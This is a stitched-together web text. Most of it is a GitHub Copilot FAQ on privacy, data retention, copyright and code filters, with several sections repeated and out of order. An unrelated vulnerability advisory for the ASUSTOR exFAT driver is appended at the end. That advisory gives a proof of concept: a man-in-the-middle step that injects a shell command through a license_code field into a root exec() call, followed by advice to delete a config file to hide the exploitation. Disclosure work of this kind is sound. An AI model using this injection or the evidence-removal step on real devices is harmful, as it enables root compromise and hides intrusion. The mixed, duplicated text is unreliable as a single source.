* **Suggestions:** These are the AI-generated code lines or chat responses provided to users based on their prompts.
* **Feedback Data:** This comprises real-time user feedback, including reactions (e.g., thumbs up/down) and optional comments, along with feedback from support tickets.

#### Does GitHub use Copilot Business or Enterprise data to train GitHub’s model?

No. GitHub does not use either Copilot Business or Enterprise data to train its models.

#### How does GitHub use the Copilot data?

How GitHub uses Copilot data depends on how the user accesses Copilot and for what purpose. Users can access GitHub Copilot through the web, extensions, mobile apps, computer terminal, and various IDEs (Integrated Development Environments). GitHub generally uses personal data to:

* Deliver, maintain, and update the services as per the customer's configuration and usage, to ensure personalized experiences and recommendations
* Troubleshoot, which involves preventing, detecting, resolving, and mitigating issues, including security incidents and product-related problems, by fixing software bugs and maintaining the online services' functionality and up-to-dateness
* Enhance user productivity, reliability, effectiveness, quality, privacy, accessibility, and security by keeping the service current and operational

These practices are outlined in GitHub’s Data Protection Agreement ([DPA)](https://github.com/customer-terms/github-data-protection-agreement), which details our data handling commitments to our data controller customers.

GitHub also uses certain personal data with customer authorization under the DPA, for the following purposes:

* Billing and account management
* To comply with and resolve legal obligations
* For abuse detection, prevention, and protection, virus scanning, and scanning to detect violations of terms of service
* To generate summary reports for calculating employee commissions and partner incentives
* To produce aggregated reports for internal use and strategic planning, covering areas like forecasting, revenue analysis, capacity planning, and product strategy,

For details on GitHub's data processing activities as a controller, particularly for Copilot Pro customers, refer to the [GitHub Privacy Statement](https://docs.github.com/en/site-policy/privacy-policies/github-general-privacy-statement).

#### How long does GitHub retain Copilot data for Business and Enterprise customers?

If and for how long GitHub’s retains Copilot data depends on how a Copilot user accesses Copilot and for what purpose. The default settings for Copilot Business and Enterprise Customers are as follows:

**Access through IDE for Chat and Code Completions:**

* Prompts and Suggestions: Not retained
* User Engagement Data: Kept for two years.
* Feedback Data: Stored for as long as needed for its intended purpose.

**All other GitHub Copilot access and use:**

* Prompts and Suggestions: Retained for 28 days.
* User Engagement Data: Kept for two years.
* Feedback Data: Stored for as long as needed for its intended purpose.

#### Why do some Copilot features retain prompts and suggestions?

Retaining prompts and suggestions is necessary for chat on github.com, mobile, and CLI Copilot because those features’ effectiveness depends on using thread history to improve responses. The Copilot model requires access to previous interactions to deliver accurate and relevant suggestions.

#### Does GitHub Copilot support compliance with the GDPR and other data protection laws?

Yes. GitHub and customers can enter a [Data Protection Agreement](https://github.com/customer-terms/github-data-protection-agreement) that supports compliance with the GDPR and similar legislation.

#### Does GitHub Copilot ever output personal data?

While we've designed GitHub Copilot with privacy in mind, the expansive definition of personal data under legislation like the EU’s General Data Protection Regulation (GDPR) means we can't guarantee it will never output such data. The Large Language Model (LLM) powering GitHub Copilot was trained on public code and there were instances in our tests where the tool made suggestions resembling personal data. These suggestions were typically synthesized and not tied to real individuals.

#### How does Copilot allow users to access, alter or delete personal data?

These actions are available to Copilot users as described in the [GitHub Privacy Statement](https://docs.github.com/en/site-policy/privacy-policies/github-general-privacy-statement#your-privacy-rights).

#### Responsible AI

#### What are the intellectual property considerations when using GitHub Copilot?

The primary IP considerations for GitHub Copilot relate to copyright. The model that powers Copilot is trained on a broad collection of publicly accessible code, which may include copyrighted code, and Copilot’s suggestions (in rare instances) may resemble the code its model was trained on. Here’s some basic information you should know about these considerations:

Copyright law permits the use of copyrighted works to train AI models:  Countries around the world have provisions in their copyright laws that enable machines to learn, understand, extract patterns, and facts from copyrighted materials, including software code. For example, the European Union, Japan, and Singapore, have express provisions permitting machine learning to develop AI models. Other countries including Canada, India, and the United States also permit such training under their fair use/fair dealing provisions. GitHub Copilot’s AI model was trained with the use of code from GitHub’s public repositories—which are publicly accessible and within the scope of permissible copyright use.

What about copyright risk in suggestions? In rare instances (less than 1% based on GitHub’s research), suggestions from GitHub may match examples of code used to train GitHub’s AI model. Again, Copilot does not “look up” or “copy and paste” code, but is instead using context from a user’s workspace to synthesize and generate a suggestion.

Our experience shows that matching suggestions are most likely to occur in two situations: (i) when there is little or no context in the code editor for Copilot’s model to synthesize, or (ii) when a matching suggestion represents a common approach or method. If a code suggestion matches existing code, there is risk that using that suggestion could trigger claims of copyright infringement, which would depend on the amount and nature of code used, and the context of how the code is used. In many ways, this is the same risk that arises when using any code that a developer does not originate, such as copying code from an online source, or reusing code from a library. That is why responsible organizations and developers recommend that users employ code scanning policies to identify and evaluate potential matching code.

In Copilot, you can opt whether to allow Copilot to suggest code completions that match publicly available code on GitHub.com. For more information, see "[Configuring GitHub Copilot settings on GitHub.com](https://docs-internal-46619-d1aa34.preview.ghdocs.com/en/copilot/configuring-github-copilot/configuring-github-copilot-settings-on-githubcom#enabling-or-disabling-duplication-detection)". If you have allowed suggestions that match public code, GitHub Copilot can provide you with details about the matching code when you accept such suggestions. Matching code does not necessarily mean copyright infringement, so it is ultimately up to the user to determine whether to use the suggestion, and what and who to attribute (along with other license compliance) in appropriate circumstances.

#### Does GitHub Copilot include a filtering mechanism to mitigate risk?

Yes, GitHub Copilot does include an optional code referencing filter to detect and suppress certain suggestions that match public code on GitHub.

* GitHub has created a duplication detection filter to detect and suppress suggestions that contain code segments over a certain length that match public code on GitHub. This filter can be enabled by the administrator for your enterprise and it can apply for all organizations within your enterprise, or the administrator can defer control to individual organizations.
* With the filter enabled, Copilot checks code suggestions for matches or near-matches against public code on GitHub of 65 lexemes or more (on average,150 characters). If there is a match, the suggestion will not be shown to the user.
* In addition to off-topic, harmful, and offensive output filters, GitHub Copilot also scans the outputs for vulnerable code.

#### Does GitHub Copilot include features to make it easier for users to identify potentially relevant open source licenses for matching suggestions?

Yes, GitHub Copilot is previewing a [code referencing feature](https://github.blog/2023-08-03-introducing-code-referencing-for-github-copilot/) as an additional tool to assist users to find and review potentially relevant open source licenses. Code referencing is currently available in Visual Studio Code. This feature searches across public GitHub repositories for code that matches a Copilot suggestion. If there’s a match, users will find its information displayed in the Copilot console log, including where the match occurred, any applicable licenses, and a deep link to learn more. The deep link will take users to a navigable page on GitHub.com to browse examples of the code match and their repository licenses, and see how many repositories—including ones without licenses—that code appears in, as well as links to those repositories. Copilot users can review this information to determine whether the applicable suggestions are suitable for use, and whether additional measures may be necessary to use them.

#### Who owns the suggestions provided by GitHub Copilot?

We don’t determine whether a suggestion is capable of being owned, but we are clear that GitHub does not claim ownership of a suggestion. Whether a suggestion generated by an AI model can be owned depends on many factors (e.g. the intellectual property law in the relevant country, the length of the suggestion, the extent that suggestion is considered ‘functional’ instead of expressive, etc).

* If a suggestion is capable of being owned, our terms are clear: GitHub does not claim ownership.
* GitHub does not claim ownership of any suggestion. In certain cases, it is possible for Copilot to produce similar suggestions to different users. For example, two unrelated users both starting new files to code the quicksort algorithm in Java will likely get the same suggestion. The possibility of providing similar suggestions to multiple users is a common part of generative AI systems.

#### Can GitHub Copilot introduce insecure code in its suggestions?

Public code may contain insecure coding patterns, bugs, or references to outdated APIs or idioms. When GitHub Copilot synthesizes code suggestions based on this data, it can also synthesize code that contains these undesirable patterns. Copilot has filters in place that either block or notify users of insecure code patterns that are detected in Copilot suggestions. These filters target the most common vulnerable coding patterns, including [hardcoded credentials](https://cwe.mitre.org/data/definitions/798.html), [SQL injections](https://cwe.mitre.org/data/definitions/89.html), and [path injections](https://cwe.mitre.org/data/definitions/22.html). Additionally, in recent years we’ve provided tools such as GitHub Advanced Security, GitHub Actions, Dependabot, and CodeQL to open source projects to help improve code quality. Of course, you should always use GitHub Copilot together with good testing and code review practices and security tools, as well as your own judgment.

#### Is GitHub Copilot intended to fully automate code generation and replace developers?

No. Copilot is a tool intended to make developers more efficient. It’s not intended to replace developers, who should continue to apply the same sorts of safeguards and diligence they would apply with regard to any third-party code of unknown origin.

* The product is called “Copilot” not “Autopilot” and it’s not intended to generate code without oversight. You should use exactly the same sorts of safeguards and diligence with Copilot’s suggestions as you would use with any third-party code.
* Identifying best practices for use of third party code is beyond the scope of this section. That said, whatever practices your organization currently uses – rigorous functionality testing, code scanning, security testing, etc. – you should continue these policies with Copilot’s suggestions. Moreover, you should make sure your code editor or editor does not automatically compile or run generated code before you review it.

#### Can GitHub Copilot users simply use suggestions without concern?

Not necessarily. GitHub Copilot users should align their use of Copilot with their respective risk tolerances.

* As noted above, GitHub Copilot is not intended to replace developers, or their individual skill and judgment, and is not intended to fully automate the process of code development. The same risks that apply to the use of any third-party code apply to the use of Copilot’s suggestions.
* Depending on your particular use case, you should consider implementing the protections discussed above. It is your responsibility to assess what is appropriate for the situation and implement appropriate safeguards.
* You’re entitled to IP indemnification from GitHub for the unmodified suggestions when Copilot’s filtering is enabled. If you do elect to enable this feature, the copyright responsibility is ours, not our customers. As part of our ongoing commitment to responsible AI, GitHub and Microsoft extends our IP indemnity and protection support to our customers who are empowering their teams with GitHub Copilot. See [Microsoft's Copilot Copyright Commitment](https://blogs.microsoft.com/on-the-issues/2023/09/07/copilot-copyright-commitment-ai-legal-concerns/) for more details.

#### Does GitHub Copilot support accessibility features?

We are conducting internal testing of GitHub Copilot’s ease of use by developers with disabilities and working to ensure that GitHub Copilot is accessible to all developers. Please feel free to share your feedback on GitHub Copilot accessibility in our [feedback forum](https://github.com/github-community/community/discussions/categories/copilot).

#### Does GitHub Copilot produce offensive outputs?

GitHub Copilot includes filters to block offensive language in the prompts and to avoid synthesizing suggestions in sensitive contexts. We continue to work on improving the filter system to more intelligently detect and remove offensive outputs. If you see offensive outputs, please report them directly to copilot-safety@github.com so that we can improve our safeguards. GitHub takes this challenge very seriously and we are committed to addressing it.

#### Will GitHub Copilot work as well using languages other than English?

Given public sources are predominantly in English, GitHub Copilot will likely work less well in scenarios where natural language prompts provided by the developer are not in English and/or are grammatically incorrect. Therefore, non-English speakers might experience a lower quality of service.

#### What data has GitHub Copilot been trained on?

GitHub Copilot is powered by generative AI models developed by GitHub, OpenAI, and Microsoft. It has been trained on natural language text and source code from publicly available sources, including code in public repositories on GitHub.

1. Data from June 2023. Additional research can be found [here](https://github.blog/news-insights/research/the-economic-impact-of-the-ai-powered-developer-lifecycle-and-lessons-from-github-copilot/).
2. Feature in public beta for Copilot Pro and Business plans. Requires use of repositories, issues, discussions, Actions, and other features of GitHub.

GeneralPlans & PricingPrivacyResponsible AI
### General

#### What is GitHub Copilot?

GitHub Copilot transforms the developer experience. Backed by the leaders in AI, Copilot provides contextualized assistance throughout the software development lifecycle, from code completions and chat assistance in the IDE to code explanations and answers to docs in GitHub and more. With Copilot elevating their workflow, developers can focus on more: value, innovation, and happiness.

GitHub Copilot enables developers to focus more energy on problem solving and collaboration and spend less effort on the mundane and boilerplate. That’s why developers who use Copilot report up to 75% higher satisfaction with their jobs than those who don’t and are up to 55% more productive at writing code without sacrifice to quality, which all adds up to engaged developers shipping great software faster.

GitHub Copilot integrates with leading editors, including Visual Studio Code, Visual Studio, JetBrains IDEs, and Neovim, and, unlike other AI coding assistants, is natively built into GitHub. Growing to millions of individual users and tens of thousands of business customers, Copilot is the world’s most widely adopted AI developer tool and the competitive advantage developers ask for by name.

#### Who is eligible to access GitHub Copilot for free?

GitHub Copilot Free is a new free pricing tier with limited functionality for individual developers. Users assigned a Copilot Business or Copilot Enterprise seat are not eligible for access. Users with access to Copilot Pro through a paid subscription, trial, or through an existing verified OSS, Student, Faculty, or MVP account may elect to use Free instead.

#### What languages, IDEs, and platforms does GitHub Copilot support?

GitHub Copilot is trained on all languages that appear in public repositories. For each language, the quality of suggestions you receive may depend on the volume and diversity of training data for that language. For example, JavaScript is well-represented in public repositories and is one of GitHub Copilot’s best supported languages. Languages with less representation in public repositories may produce fewer or less robust suggestions.

GitHub Copilot is available as an extension in Visual Studio Code, Visual Studio, Vim, Neovim, the JetBrains suite of IDEs, and Azure Data Studio. Although code completion functionality is available across all these extensions, chat functionality is currently available only in Visual Studio Code, JetBrains and Visual Studio. GitHub Copilot is also supported in terminals through GitHub CLI and as a chat integration in Windows Terminal Canary. With the GitHub Copilot Enterprise plan, GitHub Copilot is natively integrated into GitHub.com. All plans are supported in GitHub Copilot in GitHub Mobile. GitHub Mobile for Copilot Pro and Copilot Business have access to Bing and public repository code search. Copilot Enterprise in GitHub Mobile gives you additional access to your organization's knowledge.

#### Does GitHub Copilot “copy/paste”?

No, GitHub Copilot generates suggestions using probabilistic determination.

* When thinking about intellectual property and open source issues, it is critical to understand how GitHub Copilot really works. The AI models that create Copilot’s suggestions may be trained on public code, but do not contain any code. When they generate a suggestion, they are not “copying and pasting” from any codebase.
* To generate a code suggestion, the Copilot extension begins by examining the code in your editor—focusing on the lines just before and after your cursor, but also information including other files open in your editor and the URLs of repositories or file paths to identify relevant context. That information is sent to Copilot’s model, to make a probabilistic determination of what is likely to come next and generate suggestions.
* To generate a suggestion for chat in the code editor, the Copilot extension creates a contextual prompt by combining your prompt with additional context including the code file open in your active document, your code selection, and general workspace information, such as frameworks, languages, and dependencies. That information is sent to Copilot’s model, to make a probabilistic determination of what is likely to come next and generate suggestions.
* To generate a suggestion for chat on GitHub.com, such as providing an answer to a question from your chat prompt, Copilot creates a contextual prompt by combining your prompt with additional context including previous prompts, the open pages on GitHub.com as well as retrieved context from your codebase or Bing search. That information is sent to Copilot’s model, to make a probabilistic determination of what is likely to come next and generate suggestions.

#### What are the differences between the GitHub Copilot Business, GitHub Copilot Enterprise, and GitHub Copilot Individual plans?

### Privacy

#### What personal data does GitHub Copilot process?

GitHub Copilot processes personal data based on how Copilot is accessed and used: whether via GitHub.com, mobile app, extensions, or one of various IDE extensions, or through features like suggestions for the command line interface (CLI), IDE code completions, or personalized chat on GitHub.com. The types of personal data processed may include:

* **User Engagement Data:** This includes pseudonymous identifiers captured on user interactions with Copilot, such as accepted or dismissed completions, error messages, system logs, and product usage metrics.
* **Prompts:** These are inputs for chat or code, along with context, sent to Copilot's AI to generate suggestions.
* **Suggestions:** These are the AI-generated code lines or chat responses provided to users based on their prompts.
* **Feedback Data:** This comprises real-time user feedback, including reactions (e.g., thumbs up/down) and optional comments, along with feedback from support tickets.

#### Does GitHub use Copilot Business or Enterprise data to train GitHub’s model?

No. GitHub does not use either Copilot Business or Enterprise data to train its models.

#### How does GitHub use the Copilot data?

How GitHub uses Copilot data depends on how the user accesses Copilot and for what purpose. Users can access GitHub Copilot through the web, extensions, mobile apps, computer terminal, and various IDEs (Integrated Development Environments). GitHub generally uses personal data to:

* Deliver, maintain, and update the services as per the customer's configuration and usage, to ensure personalized experiences and recommendations
* Troubleshoot, which involves preventing, detecting, resolving, and mitigating issues, including security incidents and product-related problems, by fixing software bugs and maintaining the online services' functionality and up-to-dateness
* Enhance user productivity, reliability, effectiveness, quality, privacy, accessibility, and security by keeping the service current and operational

These practices are outlined in GitHub’s Data Protection Agreement ([DPA)](https://github.com/customer-terms/github-data-protection-agreement), which details our data handling commitments to our data controller customers.

GitHub also uses certain personal data with customer authorization under the DPA, for the following purposes:

* Billing and account management
* To comply with and resolve legal obligations
* For abuse detection, prevention, and protection, virus scanning, and scanning to detect violations of terms of service
* To generate summary reports for calculating employee commissions and partner incentives
* To produce aggregated reports for internal use and strategic planning, covering areas like forecasting, revenue analysis, capacity planning, and product strategy,

For details on GitHub's data processing activities as a controller, particularly for Copilot Pro customers, refer to the [GitHub Privacy Statement](https://docs.github.com/en/site-policy/privacy-policies/github-general-privacy-statement).

#### How long does GitHub retain Copilot data for Business and Enterprise customers?

If and for how long GitHub’s retains Copilot data depends on how a Copilot user accesses Copilot and for what purpose. The default settings for Copilot Business and Enterprise Customers are as follows:

**Access through IDE for Chat and Code Completions:**

* Prompts and Suggestions: Not retained
* User Engagement Data: Kept for two years.
* Feedback Data: Stored for as long as needed for its intended purpose.

**All other GitHub Copilot access and use:**

* Prompts and Suggestions: Retained for 28 days.
* User Engagement Data: Kept for two years.
* Feedback Data: Stored for as long as needed for its intended purpose.

#### Why do some Copilot features retain prompts and suggestions?

Retaining prompts and suggestions is necessary for chat on github.com, mobile, and CLI Copilot because those features’ effectiveness depends on using thread history to improve responses. The Copilot model requires access to previous interactions to deliver accurate and relevant suggestions.

#### Does GitHub Copilot support compliance with the GDPR and other data protection laws?

Yes. GitHub and customers can enter a [Data Protection Agreement](https://github.com/customer-terms/github-data-protection-agreement) that supports compliance with the GDPR and similar legislation.

#### Does GitHub Copilot ever output personal data?

While we've designed GitHub Copilot with privacy in mind, the expansive definition of personal data under legislation like the EU’s General Data Protection Regulation (GDPR) means we can't guarantee it will never output such data. The Large Language Model (LLM) powering GitHub Copilot was trained on public code and there were instances in our tests where the tool made suggestions resembling personal data. These suggestions were typically synthesized and not tied to real individuals.

#### How does Copilot allow users to access, alter or delete personal data?

These actions are available to Copilot users as described in the [GitHub Privacy Statement](https://docs.github.com/en/site-policy/privacy-policies/github-general-privacy-statement#your-privacy-rights).

### Responsible AI

#### What are the intellectual property considerations when using GitHub Copilot?

The primary IP considerations for GitHub Copilot relate to copyright. The model that powers Copilot is trained on a broad collection of publicly accessible code, which may include copyrighted code, and Copilot’s suggestions (in rare instances) may resemble the code its model was trained on. Here’s some basic information you should know about these considerations:

Copyright law permits the use of copyrighted works to train AI models:  Countries around the world have provisions in their copyright laws that enable machines to learn, understand, extract patterns, and facts from copyrighted materials, including software code. For example, the European Union, Japan, and Singapore, have express provisions permitting machine learning to develop AI models. Other countries including Canada, India, and the United States also permit such training under their fair use/fair dealing provisions. GitHub Copilot’s AI model was trained with the use of code from GitHub’s public repositories—which are publicly accessible and within the scope of permissible copyright use.

What about copyright risk in suggestions? In rare instances (less than 1% based on GitHub’s research), suggestions from GitHub may match examples of code used to train GitHub’s AI model. Again, Copilot does not “look up” or “copy and paste” code, but is instead using context from a user’s workspace to synthesize and generate a suggestion.

Our experience shows that matching suggestions are most likely to occur in two situations: (i) when there is little or no context in the code editor for Copilot’s model to synthesize, or (ii) when a matching suggestion represents a common approach or method. If a code suggestion matches existing code, there is risk that using that suggestion could trigger claims of copyright infringement, which would depend on the amount and nature of code used, and the context of how the code is used. In many ways, this is the same risk that arises when using any code that a developer does not originate, such as copying code from an online source, or reusing code from a library. That is why responsible organizations and developers recommend that users employ code scanning policies to identify and evaluate potential matching code.

In Copilot, you can opt whether to allow Copilot to suggest code completions that match publicly available code on GitHub.com. For more information, see "[Configuring GitHub Copilot settings on GitHub.com](https://docs-internal-46619-d1aa34.preview.ghdocs.com/en/copilot/configuring-github-copilot/configuring-github-copilot-settings-on-githubcom#enabling-or-disabling-duplication-detection)". If you have allowed suggestions that match public code, GitHub Copilot can provide you with details about the matching code when you accept such suggestions. Matching code does not necessarily mean copyright infringement, so it is ultimately up to the user to determine whether to use the suggestion, and what and who to attribute (along with other license compliance) in appropriate circumstances.

#### Does GitHub Copilot include a filtering mechanism to mitigate risk?

Yes, GitHub Copilot does include an optional code referencing filter to detect and suppress certain suggestions that match public code on GitHub.

* GitHub has created a duplication detection filter to detect and suppress suggestions that contain code segments over a certain length that match public code on GitHub. This filter can be enabled by the administrator for your enterprise and it can apply for all organizations within your enterprise, or the administrator can defer control to individual organizations.
* With the filter enabled, Copilot checks code suggestions for matches or near-matches against public code on GitHub of 65 lexemes or more (on average,150 characters). If there is a match, the suggestion will not be shown to the user.
* In addition to off-topic, harmful, and offensive output filters, GitHub Copilot also scans the outputs for vulnerable code.

#### Does GitHub Copilot include features to make it easier for users to identify potentially relevant open source licenses for matching suggestions?

Yes, GitHub Copilot is previewing a [code referencing feature](https://github.blog/2023-08-03-introducing-code-referencing-for-github-copilot/) as an additional tool to assist users to find and review potentially relevant open source licenses. Code referencing is currently available in Visual Studio Code. This feature searches across public GitHub repositories for code that matches a Copilot suggestion. If there’s a match, users will find its information displayed in the Copilot console log, including where the match occurred, any applicable licenses, and a deep link to learn more. The deep link will take users to a navigable page on GitHub.com to browse examples of the code match and their repository licenses, and see how many repositories—including ones without licenses—that code appears in, as well as links to those repositories. Copilot users can review this information to determine whether the applicable suggestions are suitable for use, and whether additional measures may be necessary to use them.

#### Who owns the suggestions provided by GitHub Copilot?

We don’t determine whether a suggestion is capable of being owned, but we are clear that GitHub does not claim ownership of a suggestion. Whether a suggestion generated by an AI model can be owned depends on many factors (e.g. the intellectual property law in the relevant country, the length of the suggestion, the extent that suggestion is considered ‘functional’ instead of expressive, etc).

* If a suggestion is capable of being owned, our terms are clear: GitHub does not claim ownership.
* GitHub does not claim ownership of any suggestion. In certain cases, it is possible for Copilot to produce similar suggestions to different users. For example, two unrelated users both starting new files to code the quicksort algorithm in Java will likely get the same suggestion. The possibility of providing similar suggestions to multiple users is a common part of generative AI systems.

#### Can GitHub Copilot introduce insecure code in its suggestions?

Public code may contain insecure coding patterns, bugs, or references to outdated APIs or idioms. When GitHub Copilot synthesizes code suggestions based on this data, it can also synthesize code that contains these undesirable patterns. Copilot has filters in place that either block or notify users of insecure code patterns that are detected in Copilot suggestions. These filters target the most common vulnerable coding patterns, including [hardcoded credentials](https://cwe.mitre.org/data/definitions/798.html), [SQL injections](https://cwe.mitre.org/data/definitions/89.html), and [path injections](https://cwe.mitre.org/data/definitions/22.html). Additionally, in recent years we’ve provided tools such as GitHub Advanced Security, GitHub Actions, Dependabot, and CodeQL to open source projects to help improve code quality. Of course, you should always use GitHub Copilot together with good testing and code review practices and security tools, as well as your own judgment.

# ASUSTOR exFAT Driver RCE

## Vulnerable Versions

* ASUSTOR exFAT Driver <= 1.0.0.r20

## References

* CVE-2019-11688 - TLS validation failure
* CVE-2019-11689 - Improper input sanitization

## Overview

[exFAT](https://en.wikipedia.org/wiki/ExFAT) is a filesystem designed for external storage devices and is defined as the SD Card Association standard filesystem for SD cards over 32 GB. Because the underlying technology is patented by Microsoft, NAS providers have began selling support for the filesystem as an addon driver.

The ASUSTOR exFAT implementation is available via [App Central](https://www.asustor.com/app_central/app_detail?id=776&type=). Once installed, a license key must be entered, which is online validated against an ASUSTOR server.

During this online check, the licensing application is vulnerable to a man-in-the-middle attack and ultimately remote code execution. The licensing application runs as root on the device.

## POC

### Prerequisites

1. Install ASUSTOR exFAT Driver from App Central
2. Intercept TLS traffic to asustornasapi.asustor.com by your preferred means (mitmproxy and DNS interception was used during POC development)

### Exploitation

1. Intercept HTTP POST to `/test/exfat/AS16xxxxxxxxxxxx`
2. Rewrite server response to
   `{"success":true}`
3. Intercept second HTTP POST to `/test/exfat/AS16xxxxxxxxxxxx`
4. Rewrite server response to
   `{"success":true,"registered":true,"license_code":"';touch /tmp/RCE;echo '"}`
   *Note: Payload is passed directly to exec(), so quotes must be properly matched to avoid shell errors.*
5. Remove `/usr/builtin/etc/reg.conf` file to eliminate any evidence of exploitation.

## Vendor Response

* 04/27/2019 - Emailed security@asustor.com, received email bounce
* 04/28/2019 - General support provided an internal contact for security issues
* 04/29/2019 - Details sent to internal contact
* 05/02/2019 - ASUSTOR confirms vulnerability and fix, requested disclosure timeline
